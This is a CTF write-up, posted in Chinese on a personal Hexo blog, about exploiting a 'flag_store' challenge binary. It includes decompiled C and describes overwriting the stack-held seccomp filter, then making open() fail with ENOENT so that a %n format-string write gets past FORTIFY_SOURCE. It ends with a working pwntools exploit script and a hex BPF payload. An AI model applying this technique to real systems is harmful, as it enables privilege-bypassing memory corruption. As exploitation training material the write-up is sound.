@@ -1,0 +1,202 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8" />
+  
+  <title>bpf | Another&#39;s blog</title>
+  <meta name="author" content="another" />
+
+  
+  <meta name="description" content="123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798" />
+  
+
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+  <meta property="og:title" content="bpf" />
+  <meta property="og:site_name" content="Another&#39;s blog" />
+
+  
+  
+
+  
+    <meta property="og:image" content="" />
+  
+
+  
+  <link href="/css/images/favicon.ico" rel="icon" />
+  
+
+  <link rel="alternate" href="/atom.xml" title="Another&#39;s blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+
+
+  <!-- baidu webmaster push -->
+  <script src='//push.zhanzhang.baidu.com/push.js'></script>
+
+</head>
+
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">Another&#39;s blog</a></h1>
+  <h2><a href="/"></a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">Home</a></li>
+    
+      <li><a href="/archives">Archives</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div></header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2018-07-07T07:58:18.000Z"><a href="/2018/07/07/bpf/">2018-07-07</a></time>
+      
+      
+  
+    <h1 class="title">bpf</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_flag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x40</span>);</span><br><span class="line">  fd = open(<span class="string">"flag.txt"</span>, <span class="number">0x80000</span>);</span><br><span class="line">  read(fd, buf, <span class="number">0x40</span>);</span><br><span class="line">  write(<span class="number">1</span>, buf, <span class="number">0x40</span>);</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v18[<span class="number">32</span>];</span><br><span class="line">  <span class="keyword">short</span> v19;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">char</span>* secret;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">int</span> j;</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  sercet = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="keyword">if</span> (!secret)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  fd = open(<span class="string">"secret.txt"</span>, <span class="number">0x80000</span>);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  v8 = read(fd, secret, <span class="number">0x40</span>);</span><br><span class="line">  <span class="keyword">if</span> (v8 == <span class="number">-1</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  secret[v8] = <span class="number">0</span>;</span><br><span class="line">  close(fd);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//seccomp BPF</span></span><br><span class="line">  v19 = <span class="number">32</span>;</span><br><span class="line">  v20 = <span class="number">0</span>;</span><br><span class="line">  v21 = <span class="number">0</span>;</span><br><span class="line">  v22 = <span class="number">4</span>;</span><br><span class="line">  v23 = <span class="number">21</span>;</span><br><span class="line">  v24 = <span class="number">1</span>;</span><br><span class="line">  v25 = <span class="number">0</span>;</span><br><span class="line">  v26 = <span class="number">-1073741762</span>;</span><br><span class="line">  v27 = <span class="number">6</span>;</span><br><span class="line">  v28 = <span class="number">0</span>;</span><br><span class="line">  v29 = <span class="number">0</span>;</span><br><span class="line">  v30 = <span class="number">0</span>;</span><br><span class="line">  v31 = <span class="number">32</span>;</span><br><span class="line">  v32 = <span class="number">0</span>;</span><br><span class="line">  v33 = <span class="number">0</span>;</span><br><span class="line">  v34 = <span class="number">0</span>;</span><br><span class="line">  v35 = <span class="number">21</span>;</span><br><span class="line">  v36 = <span class="number">0</span>;</span><br><span class="line">  v37 = <span class="number">1</span>;</span><br><span class="line">  v38 = <span class="number">231</span>;</span><br><span class="line">  v39 = <span class="number">6</span>;</span><br><span class="line">  v40 = <span class="number">0</span>;</span><br><span class="line">  v41 = <span class="number">0</span>;</span><br><span class="line">  v42 = <span class="number">2147418112</span>;</span><br><span class="line">  v43 = <span class="number">21</span>;</span><br><span class="line">  v44 = <span class="number">0</span>;</span><br><span class="line">  v45 = <span class="number">1</span>;</span><br><span class="line">  v46 = <span class="number">0</span>;</span><br><span class="line">  v47 = <span class="number">6</span>;</span><br><span class="line">  v48 = <span class="number">0</span>;</span><br><span class="line">  v49 = <span class="number">0</span>;</span><br><span class="line">  v50 = <span class="number">2147418112</span>;</span><br><span class="line">  v51 = <span class="number">21</span>;</span><br><span class="line">  v52 = <span class="number">0</span>;</span><br><span class="line">  v53 = <span class="number">1</span>;</span><br><span class="line">  v54 = <span class="number">2</span>;</span><br><span class="line">  v55 = <span class="number">6</span>;</span><br><span class="line">  v56 = <span class="number">0</span>;</span><br><span class="line">  v57 = <span class="number">0</span>;</span><br><span class="line">  v58 = <span class="number">2147418112</span>;</span><br><span class="line">  v59 = <span class="number">21</span>;</span><br><span class="line">  v60 = <span class="number">0</span>;</span><br><span class="line">  v61 = <span class="number">1</span>;</span><br><span class="line">  v62 = <span class="number">1</span>;</span><br><span class="line">  v63 = <span class="number">6</span>;</span><br><span class="line">  v64 = <span class="number">0</span>;</span><br><span class="line">  v65 = <span class="number">0</span>;</span><br><span class="line">  v66 = <span class="number">2147418112</span>;</span><br><span class="line">  v67 = <span class="number">21</span>;</span><br><span class="line">  v68 = <span class="number">0</span>;</span><br><span class="line">  v69 = <span class="number">1</span>;</span><br><span class="line">  v70 = <span class="number">3</span>;</span><br><span class="line">  v71 = <span class="number">6</span>;</span><br><span class="line">  v72 = <span class="number">0</span>;</span><br><span class="line">  v73 = <span class="number">0</span>;</span><br><span class="line">  v74 = <span class="number">2147418112</span>;</span><br><span class="line">  v75 = <span class="number">6</span>;</span><br><span class="line">  v76 = <span class="number">0</span>;</span><br><span class="line">  v77 = <span class="number">0</span>;</span><br><span class="line">  v78 = <span class="number">0</span>;</span><br><span class="line">  v16 = <span class="number">15</span>;</span><br><span class="line">  v17 = &amp;v19;</span><br><span class="line">  </span><br><span class="line">  seccomp_setup = <span class="number">0</span>;</span><br><span class="line">  v15 = &amp;v16;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i=<span class="number">16</span>;i&gt;<span class="number">0</span>;i--) &#123;</span><br><span class="line">    v18[syscall(<span class="number">0</span>, <span class="number">0</span>, v18, <span class="number">96</span>)] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> (!seccomp_setup) &#123;</span><br><span class="line">      <span class="keyword">if</span> (prctl(PR_SET_NO_NEW_PRIVS, <span class="number">0x1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (prctl(PR_SET_SECCOMP, <span class="number">0x2</span>, v15))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v11 = <span class="built_in">strlen</span>(secret) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (j=<span class="number">0</span>; ;j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (v11 - <span class="number">1</span> == j)</span><br><span class="line">        <span class="keyword">goto</span> LABEL_SHOW_FLAG;</span><br><span class="line">      <span class="keyword">if</span> (secret[j] != v18[j])</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Wrong secret :/"</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(secret) == j)</span><br><span class="line">LABEL_SHOW_FLAG:</span><br><span class="line">      show_flag();</span><br><span class="line"></span><br><span class="line">    _fprintf_chk(<span class="built_in">stderr</span>, <span class="number">1</span>, v18);</span><br><span class="line">    seccomp_setup = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code>所以，二进制文件加载“secret.txt”，
+如果我们发送正确的秘密，我们将会得到该标志的奖励。
+我在工作目录中创建了“secret.txt”和“flag.txt”，
+并在执行二进制文件时发现存在格式字符串漏洞。
+我们可以用“％p％p％s”泄漏正确的秘密，
+因为指向秘密的指针位于堆栈中。不那么容易:)格式字符串存在，
+但输出打印到stderr。因此，不可能将其远程泄漏。
+另外,启用FORTIFY_SOURCE可防止使用%n可写内存段。
+您可能注意到SECCOMP过滤器正在堆栈中初始化。
+我在运行时转储它并使用seccomp-tools反汇编规则
+</code></pre><h1 id="bpf分析"><a href="#bpf分析" class="headerlink" title="bpf分析"></a>bpf分析</h1><pre><code>exit_group，read，open，write和close被启用。
+然后，我注意到程序在缓冲区中读取了96个字符，其大小为32.在应用规则之前，我们可以在第一次读取时将缓冲区溢出到SECCOMP BPF中。我们只能写一个新的BPF，
+只有64个字节。编写一个新的过滤器很容易，
+它允许每个系统调用，但是这对我们无能为力。
+
+当开始跟踪系统调用时%n，printf_chk它会打开“/ self / proc / maps”
+以检查缓冲区是否位于可写段中。
+我们开始深入研究glibc源代码，
+并发现它：readonly-area.c。
+具体来说，我们需要打开return ENOENT
+或者EACCEScheck内部__readonly_area()
+通过并返回1，这是绕过%n过滤 所必需的。
+我们可以让SECCOMP返回一个任意的错误，
+而不用ERRNO执行系统调用 
+</code></pre><p>从Linux SECCOMP手册页：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SECCOMP_RET_ERRNO</span><br><span class="line">              This value results in the SECCOMP_RET_DATA portion of the fil‐</span><br><span class="line">              ter&apos;s return value being passed to user space as the errno</span><br><span class="line">              value without executing the system call.</span><br></pre></td></tr></table></figure>
+<p>我使用了这个过滤器，并将最低有效16位（由常量SECCOMP_RET_DATA定义）修补为ENOENT=0x2：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A = sys_number</span><br><span class="line">A != open ? ok : next</span><br><span class="line">return ERRNO</span><br><span class="line">ok:</span><br><span class="line">return ALLOW</span><br></pre></td></tr></table></figure>
+<pre><code>%n正在工作！但还有一小步。之前的过滤器也会阻止open(&quot;flag.txt&quot;, 0x80000)系统调用。
+标志是相同的（0x80000），所以我们不能使用基于这个参数的过滤器。
+然而，无论PIE被启用，哪个随机化文本地址，
+我们知道“flag.txt”地址的最后一个字节是0x64 _rodata。
+</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">A = sys_number</span><br><span class="line">A != open ? ok : next</span><br><span class="line">A = args[0]</span><br><span class="line">A &amp;= 0xff</span><br><span class="line">A == 0x64 ? ok : next</span><br><span class="line">return ERRNO</span><br><span class="line">ok:</span><br><span class="line">return ALLOW</span><br></pre></td></tr></table></figure>
+<h1 id="编译方法-asm"><a href="#编译方法-asm" class="headerlink" title="编译方法 asm"></a>编译方法 asm</h1><p>我用seccomp-tools编译了这个过滤器，并将其用于我的漏洞利用：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">"./flag_store"</span>)</span><br><span class="line"><span class="comment">#r = remote("35.198.105.104", 10000)</span></span><br><span class="line"></span><br><span class="line">bpf = <span class="string">"20000000000000001500000402000000200000001000000054000000ff00000015000100640000000600000002000500060000000000ff7f"</span>.decode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line">r.send((<span class="string">"A"</span>*<span class="number">32</span> + bpf))</span><br><span class="line">r.recvuntil(<span class="string">"Wrong secret :/"</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">"%c%c%n"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Wrong secret :/"</span>)</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">"\x02"</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+        
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <div class="search">
+  <form action="//google.com/search" method="get" accept-charset="utf-8">
+    <input type="search" name="q" results="0" placeholder="Search">
+    <input type="hidden" name="q" value="site:yoursite.com">
+  </form>
+</div>
+
+  
+
+  
+<div class="widget tag">
+  <h3 class="title">Recent Posts</h3>
+  <ul class="entry">
+    
+      <li>
+        <a href="/2018/07/07/sulb/">slub</a>
+      </li>
+    
+      <li>
+        <a href="/2018/07/07/afl/">afl</a>
+      </li>
+    
+      <li>
+        <a href="/2018/07/07/glibc malloc和free/">glibc malloc和free</a>
+      </li>
+    
+      <li>
+        <a href="/2018/07/07/brop/">brop</a>
+      </li>
+    
+      <li>
+        <a href="/2018/07/07/hexo/">搭建博客</a>
+      </li>
+    
+  </ul>
+</div>
+
+
+  
+
+  
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  <p>
+  
+  &copy; 2018 another
+  
+  All rights reserved.</p>
+  <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
+</div>
+<div class="clearfix"></div>
+
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script></footer>
+  <script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+<div id='bg'></div>
+</body>
+</html>
